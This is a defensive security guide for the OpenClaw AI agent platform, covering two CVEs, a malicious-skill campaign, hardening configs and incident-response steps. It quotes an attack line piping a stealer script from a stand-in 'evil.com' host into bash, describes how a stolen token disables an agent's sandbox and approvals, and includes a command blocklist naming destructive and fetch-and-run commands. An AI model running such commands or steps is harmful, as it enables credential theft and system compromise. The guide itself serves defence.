# OpenClaw Security Guide 2026 - Community & Researcher Findings

**Source:** CVE databases, security research, community incidents
**Last updated:** 2026-02-03
**Threat level:** HIGH (active exploitation in the wild)

---

## 🚨 CRITICAL VULNERABILITIES (PATCH NOW!)

### **CVE-2026-25253: One-Click RCE (CVSS 8.8) - SEVERE**

**Discovered:** January 30, 2026
**Patched:** Version 2026.1.29+
**Exploit:** Unauthenticated remote code execution

**How it works:**
```
1. Attacker creates malicious website
2. User visits website (or clicks link)
3. Malicious JavaScript exfiltrates gateway token via WebSocket
   └─ Exploits: Unvalidated gatewayUrl query param in Control UI
4. Attacker uses stolen token to:
   ├─ Disable sandbox (sandbox.enabled = false)
   ├─ Disable approvals (exec.approvals = off)
   ├─ Set exec.host to "gateway" (escape container)
   └─ Execute arbitrary commands via tools.exec
5. Full system compromise

Time to compromise: Milliseconds
Works even on: localhost-only gateways (browser bridges connection)
```

**Check if vulnerable:**
```bash
ssh hostinger "cd /root/openclaw && cat package.json | grep version"
# If < 2026.1.29: VULNERABLE!
```

**Fix:**
```bash
ssh hostinger "cd /root/openclaw && git pull && pnpm install && pnpm build"
ssh hostinger "systemctl --user restart openclaw-gateway"
ssh hostinger "cd /root/openclaw && pnpm openclaw --version"
# Should be >= 2026.1.29
```

**Detection (was compromised?):**
```bash
# Check logs for suspicious config changes
grep -i "sandbox.*false\|approvals.*off\|exec.host.*gateway" /root/.openclaw/logs/*.log

# Check current config
cat /root/.openclaw/openclaw.json | jq '.sandbox.enabled, .tools.exec.approvalRequired'
# Should be: true, true
```

**Links:**
- [NVD CVE Details](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)
- [The Hacker News](https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html)
- [runZero Advisory](https://www.runzero.com/blog/openclaw/)

---

### **CVE-2026-24763: Command Injection in Docker Sandbox**

**Discovered:** January 29, 2026
**Patched:** Version 2026.1.29+
**Exploit:** Authenticated command injection

**How it works:**
```
Attacker with gateway access:
1. Sets malicious PATH environment variable
2. OpenClaw executes command in Docker sandbox
3. PATH injection allows arbitrary command execution
4. Container escape possible
```

**Fix:**
```bash
# Same update as above (2026.1.29+)
# No additional config needed - patch fixes code
```

**Links:**
- [CVE Details](https://cvefeed.io/vuln/detail/CVE-2026-24763)

---

## 🦠 CLAWHUB MALWARE CAMPAIGN (Active Threat)

### **ClawHavoc Campaign**

**Discovered:** Late January 2026
**Scale:** 341 malicious skills out of 2,857 scanned
**Malware:** Atomic Stealer, trojans, infostealers

**What was compromised:**
```
Skills targeting:
├─ Crypto wallets (private keys, API keys)
├─ Browser credentials (passwords, cookies)
├─ SSH keys (~/.ssh/)
├─ System credentials
└─ Personal documents
```

**Publisher:** "hightower6eu" (314 malicious skills)
**C2 Infrastructure:** 91.92.242.30

**Common disguises:**
- "Crypto Analytics Pro"
- "Finance Tracker Advanced"
- "Social Media Manager"
- "Wallet Automation Helper"

**Attack pattern:**
```
Skill description: "Helpful crypto tool!"
SKILL.md: "Run this setup command..."
User runs: curl evil.com/stealer.sh | bash
Result: Credentials exfiltrated
```

**How to detect:**
```bash
# Check installed skills
openclaw skills list

# For each suspicious skill:
cat /root/openclaw/skills/<skill-name>/SKILL.md

# Red flags:
- Asks you to run terminal commands
- Downloads binaries
- Requests sudo
- Accesses ~/.ssh, wallets, browsers
- Has obfuscated code
```

**How to clean:**
```bash
# Remove all crypto/wallet skills (unless YOU created them)
rm -rf /root/openclaw/skills/*crypto*
rm -rf /root/openclaw/skills/*wallet*

# Reinstall from trusted sources only
```

**Links:**
- [VirusTotal Analysis](https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html)
- [The Hacker News](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
- [Tom's Hardware](https://www.tomshardware.com/tech-industry/cyber-security/malicious-moltbot-skill-targets-crypto-users-on-clawhub)
- [CyberSecurityNews](https://cybersecuritynews.com/openclaw-ai-agent-skills-abused/)

---

## 🛡️ SKILL SECURITY SCANNING

### **Before Installing ANY Skill:**

**1. Manual Review:**
```bash
# View skill before installing
npx clawhub show <skill-name>

# Check source code
cat SKILL.md
cat *.js *.ts

# Red flags:
❌ Obfuscated code (hex strings, base64)
❌ External downloads (curl, wget)
❌ Terminal command instructions
❌ Asks for sudo/root
❌ Accesses sensitive paths (~/.ssh, ~/Documents)
❌ Network requests to unknown domains
```

**2. VirusTotal Scan:**
```bash
# If skill has binaries/scripts:
# Upload to virustotal.com
# Check: 0 detections required
```

**3. Reputation Check:**
```bash
# ClawHub stats:
- Installs: 1000+ ✅ (500+ acceptable, <100 risky)
- Age: 30+ days ✅ (new = unreviewed)
- Author: Known maintainer ✅
- Reports: 0 abuse reports ✅
```

**4. Sandboxed Test:**
```bash
# Test in isolated environment first
docker run --rm -it -v /tmp/test:/workspace openclaw
# Install skill there, test behavior
# If safe → install on production
```

---

## 🔐 CREDENTIAL STORAGE BEST PRACTICES

### **❌ DON'T (Vulnerable):**

```bash
# Storing in git
git add .openclaw/credentials/
git commit -m "add credentials"
# Result: Credentials leaked on GitHub

# Plain text files
echo "sk-ant-key123" > api-key.txt
# Result: Readable by compromised agent

# Environment variables in code
export ANTHROPIC_API_KEY="sk-ant-key123"
# Result: Visible in process list (ps aux)
```

### **✅ DO (Secure):**

**Option 1: Doppler (Recommended):**
```bash
# 1. Setup Doppler
doppler login
doppler setup --project ai-tools --config production

# 2. Add secrets
doppler secrets set ANTHROPIC_API_KEY "sk-ant-..."
doppler secrets set OPENAI_API_KEY "sk-..."

# 3. Run with Doppler
doppler run -- openclaw gateway

# Secrets never touch disk!
```

**Option 2: Systemd Environment File (Linux):**
```bash
# Create protected env file
cat > /etc/systemd/user/openclaw-env << EOF
ANTHROPIC_API_KEY=sk-ant-...
OPENAI_API_KEY=sk-...
EOF

chmod 600 /etc/systemd/user/openclaw-env

# Reference in service
# /etc/systemd/user/openclaw-gateway.service:
[Service]
EnvironmentFile=/etc/systemd/user/openclaw-env
ExecStart=/usr/bin/openclaw gateway
```

**Option 3: Encrypted File:**
```bash
# Encrypt credentials
gpg -c credentials.json
# Creates: credentials.json.gpg

# Decrypt at runtime
gpg -d credentials.json.gpg > /tmp/creds.json
export ANTHROPIC_API_KEY=$(jq -r .anthropic_key /tmp/creds.json)
openclaw gateway
rm /tmp/creds.json  # Clean up
```

---

## 🌐 NETWORK ISOLATION

### **Gateway Binding (CRITICAL):**

**❌ DANGEROUS:**
```json
{
  "gateway": {
    "host": "0.0.0.0",  // Exposed to internet!
    "port": 18789
  }
}
```

**✅ SAFE:**
```json
{
  "gateway": {
    "host": "127.0.0.1",  // Localhost only
    "port": 18789
  }
}
```

### **Remote Access (Secure Methods):**

**Method 1: SSH Tunnel (Simple)**
```bash
# From client machine:
ssh -f -N -L 18789:127.0.0.1:18789 your-vps

# Access: http://localhost:18789
```

**Method 2: Tailscale (Better)**
```bash
# On VPS:
tailscale up
tailscale serve http://localhost:18789

# Access from any Tailscale device:
# https://hostname.your-tailnet.ts.net
```

**Method 3: Cloudflare Tunnel (Enterprise)**
```bash
cloudflared tunnel create openclaw
cloudflared tunnel route dns openclaw openclaw.yourdomain.com
cloudflared tunnel run openclaw
```

### **Firewall Rules:**

```bash
# Allow ONLY SSH
ufw default deny incoming
ufw allow 22/tcp
ufw enable

# Gateway NOT exposed (accessed via tunnel)
# No rules for 18789
```

---

## 🔑 AUTHENTICATION METHODS

### **Gateway Token (Current):**

```json
{
  "gateway": {
    "auth": {
      "mode": "token",
      "token": "<strong-random-token>"
    }
  }
}
```

**Generate strong token:**
```bash
openssl rand -hex 32
# Example: 51c8c0d43559c28bc7b5d79088bc788192dd617dcd5d5c2167d47d21b0eaa984
```

**Security notes:**
- ✅ Rotate token monthly
- ✅ Store in password manager
- ✅ Never commit to git
- ✅ Use different tokens per environment (dev/prod)

### **WebSocket Origin Validation (Post-CVE Fix):**

**Ensure config validates origins:**
```json
{
  "gateway": {
    "cors": {
      "enabled": true,
      "allowedOrigins": [
        "http://localhost:18789",
        "https://your-tailscale-hostname.ts.net"
      ]
    }
  }
}
```

---

## 🎯 PRODUCTION SECURITY CHECKLIST

### **Before Deployment:**

- [ ] Update to 2026.1.29+ (RCE patches)
- [ ] Gateway bound to 127.0.0.1 only
- [ ] Strong random gateway token (32+ bytes)
- [ ] Secrets via Doppler (not files/git)
- [ ] DM policy set to "allowlist"
- [ ] Firewall configured (SSH only)
- [ ] Docker sandbox enabled
- [ ] Tool approval enabled for exec
- [ ] SSH key-only auth (no password)
- [ ] Fail2ban installed and active
- [ ] Auto-updates enabled
- [ ] Backup strategy implemented

### **After Deployment:**

- [ ] No skills from ClawHub (unless reviewed)
- [ ] Monitor logs daily for suspicious activity
- [ ] Check config hasn't been tampered
- [ ] Rotate gateway token monthly
- [ ] Review allowlist quarterly
- [ ] Security audit monthly
- [ ] Penetration test quarterly (if business-critical)

---

## 🔍 PENETRATION TESTING FINDINGS

### **Researcher: Mav Levin (DepthFirst)**

**Finding:** Sandbox limits ineffective against token theft
**Impact:** Even sandboxed setups fully compromisable via UI exploit
**Recommendation:** "Rethink API safety management entirely"

### **Researcher: Jamieson O'Reilly**

**Finding:** WebSocket hijacking bypasses all network isolation
**Impact:** localhost binding doesn't protect against browser-based attacks
**Recommendation:** Validate all WebSocket origins, short-lived tokens

### **General Findings:**

```
Attack Surface:
├─ WebSocket (token theft) - HIGH RISK
├─ Skills (malware) - HIGH RISK
├─ Prompt injection (via email/web) - MEDIUM RISK
├─ Browser automation (XSS) - MEDIUM RISK
└─ File system access (if compromised) - HIGH RISK

Defense Layers:
1. Update immediately (patches)
2. Network isolation (localhost + tunnel)
3. Origin validation (WebSocket)
4. Skill vetting (manual review)
5. Sandbox always (Docker)
6. Credentials external (Doppler)
7. Monitoring (logs + alerts)
```

---

## 🛡️ ZERO-TRUST ARCHITECTURE

### **Principles for AI Agents:**

**1. Assume Breach:**
- Agent is compromised until proven otherwise
- Every action requires validation
- No implicit trust

**2. Micro-Segmentation:**
- Agent can't access anything it doesn't need
- Separate credentials per service
- Network isolation per agent

**3. Least Privilege:**
- Read-only by default
- Write only when necessary
- Exec only with approval

**4. Continuous Verification:**
- Audit every action
- Logs immutable and external
- Alert on anomalies

### **Implementation:**

```json
{
  "sandbox": {
    "enabled": true,
    "mode": "docker",
    "workspace": "read-only"  // Upgrade to read-write when needed
  },
  "tools": {
    "filesystem": {
      "enabled": true,
      "readOnly": true,  // Can read, can't write
      "allowedPaths": ["/root/.openclaw/workspace"]
    },
    "exec": {
      "enabled": true,
      "approvalRequired": true,  // Ask before running
      "blocklist": ["rm -rf", "chmod 777", "dd if=", "curl * | bash"]
    },
    "browser": {
      "enabled": true,
      "mode": "openclaw",  // Isolated instance
      "sandbox": true
    },
    "web_fetch": {
      "enabled": true,
      "timeout": 30000,
      "allowedDomains": ["github.com", "wikipedia.org"]  // Whitelist
    }
  },
  "channels": {
    "whatsapp": {
      "dmPolicy": "allowlist",  // Not "open"
      "allowFrom": ["+your-number-only"]
    }
  }
}
```

---

## 🚨 INCIDENT RESPONSE

### **If Compromised:**

**1. Immediate Actions (First 5 Minutes):**
```bash
# 1. Stop gateway
ssh hostinger "systemctl --user stop openclaw-gateway"

# 2. Disconnect from internet
ssh hostinger "ip link set eth0 down"

# 3. Snapshot VM (for forensics)
# Via provider panel: Take snapshot NOW

# 4. Check what was accessed
grep -r "exec\|write\|delete" /root/.openclaw/logs/*.log > /tmp/incident-log.txt
```

**2. Investigation (Next Hour):**
```bash
# Check config modifications
diff /root/.openclaw/openclaw.json /root/.openclaw/openclaw.json.bak

# Check installed skills
ls -laR /root/openclaw/skills/

# Check cron jobs
openclaw cron list

# Review memory (what agent learned)
cat /root/.openclaw/workspace/MEMORY.md

# Check outbound connections
netstat -an | grep ESTABLISHED
```

**3. Cleanup:**
```bash
# Remove malicious skills
rm -rf /root/openclaw/skills/<malicious-skill>

# Reset config
cp /root/.openclaw/openclaw.json.backup /root/.openclaw/openclaw.json

# Rotate ALL credentials
doppler secrets set ANTHROPIC_API_KEY "new-key"
# Rotate: GitHub tokens, API keys, gateway token

# Rebuild from clean state
cd /root/openclaw
git fetch origin
git reset --hard origin/main
pnpm install
pnpm build
```

**4. Recovery:**
```bash
# Restore from backup
rsync -avz ~/backup/openclaw-workspace/ hostinger:/root/.openclaw/workspace/

# Verify integrity
openclaw doctor --fix

# Restart
systemctl --user start openclaw-gateway

# Monitor closely
tail -f /root/.openclaw/logs/*.log
```

---

## 📊 SECURITY RESEARCHER RECOMMENDATIONS

### **From Mav Levin (DepthFirst):**

> "OpenClaw's sandbox limits are ineffective against token-based attacks.
> The issue isn't sandboxing execution—it's trusting UI WebSocket connections.
> Rethink how API safety is managed at the architecture level."

**Recommendations:**
1. Don't trust query parameters (validate origins server-side)
2. Short-lived tokens with scopes (not permanent admin tokens)
3. API config changes should require re-auth
4. Sandbox escape must be prevented at kernel level (not just Docker)

### **From Jamieson O'Reilly:**

> "The vulnerability works even on localhost-only setups because
> the browser bridges the connection. Network isolation isn't enough."

**Recommendations:**
1. Validate WebSocket origin headers strictly
2. Token binding to specific origins
3. Consider magic links (one-time use tokens)
4. External systems (Moltbook) should be isolated

### **From 1Password Security Team:**

> "OpenClaw represents magic turning to malware when skills
> become attack surfaces. Treat skills as untrusted executables."

**Recommendations:**
1. Never install skills without reviewing source
2. Implement permission brokering (not static file creds)
3. Runtime mediation for every action
4. Trust nothing, verify everything

---

## 🎯 PRODUCTION SECURITY POSTURE

### **Security Levels:**

**Level 1: Personal, Low-Risk (Acceptable):**
```
✓ Updated to latest version
✓ localhost binding
✓ SSH tunnel access
✓ Allowlist on channels
✓ No ClawHub skills
✓ Manual backups
```

**Level 2: Personal, High-Value (Recommended):**
```
✓ All Level 1 +
✓ Docker sandbox enabled
✓ Tool approvals required
✓ Doppler for secrets
✓ Daily automated backups
✓ Weekly security reviews
✓ Firewall + Fail2ban
```

**Level 3: Business/Team (Required):**
```
✓ All Level 2 +
✓ Tailscale or VPN access only
✓ Read-only filesystem by default
✓ Custom skills only (no ClawHub)
✓ Immutable audit logs (external)
✓ SOC monitoring integration
✓ Penetration testing quarterly
✓ Incident response plan documented
```

---

## 🚦 THREAT MATRIX

| Threat | Likelihood | Impact | Mitigation |
|--------|------------|--------|------------|
| **RCE via CVE-2026-25253** | HIGH (if < 2026.1.29) | CRITICAL | Update immediately |
| **Malicious skills** | HIGH (341+ on ClawHub) | HIGH | Review before install |
| **Token theft** | MEDIUM | CRITICAL | Validate origins |
| **Prompt injection** | MEDIUM | MEDIUM | Allowlist, sandbox |
| **Credential leak** | LOW (if Doppler used) | CRITICAL | Doppler + .gitignore |
| **Public exposure** | LOW (if localhost) | CRITICAL | Never bind 0.0.0.0 |

---

## 📚 Security Resources

**Official:**
- [Security Documentation](https://docs.openclaw.ai/gateway/security)
- [Troubleshooting](https://docs.openclaw.ai/gateway/troubleshooting)

**CVE Databases:**
- [CVE-2026-25253](https://nvd.nist.gov/vuln/detail/CVE-2026-25253)
- [CVE-2026-24763](https://cvefeed.io/vuln/detail/CVE-2026-24763)

**Security Research:**
- [runZero Analysis](https://www.runzero.com/blog/openclaw/)
- [The Register Security Report](https://www.theregister.com/2026/02/02/openclaw_security_issues/)
- [1Password Blog](https://1password.com/blog/from-magic-to-malware-how-openclaws-agent-skills-become-an-attack-surface)
- [Permiso Research](https://permiso.io/blog/inside-the-openclaw-ecosystem-ai-agents-with-privileged-credentials)
- [VentureBeat CISO Guide](https://venturebeat.com/security/openclaw-agentic-ai-security-risk-ciso-guide)

**Malware Analysis:**
- [VirusTotal Report](https://blog.virustotal.com/2026/02/from-automation-to-infection-how.html)
- [The Hacker News](https://thehackernews.com/2026/02/researchers-find-341-malicious-clawhub.html)
- [CyberSecurity News](https://cybersecuritynews.com/openclaw-ai-agent-skills-abused/)

---

## ⚠️ CURRENT THREAT LEVEL: ELEVATED

**As of February 2026:**
- Active RCE exploitation in the wild
- ClawHub malware campaign ongoing
- 21,000+ instances publicly exposed
- New vulnerabilities being discovered weekly

**Action:** Treat OpenClaw as HIGH-RISK infrastructure requiring security hardening.

---

**This guide reflects ACTUAL attacks and vulnerabilities, not theoretical risks.**
**Update as new threats emerge.**
